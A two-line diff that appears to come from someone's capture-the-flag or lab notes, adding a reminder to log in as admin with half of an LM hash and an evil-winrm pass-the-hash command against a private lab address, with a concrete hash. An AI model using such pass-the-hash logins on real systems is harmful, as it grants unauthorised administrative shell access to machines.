@@ -1,0 +1,2 @@
+LOG IN TO ADMIN WITH LM HASH (HALF ONLY)
+evil-winrm -i 10.10.106.230 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
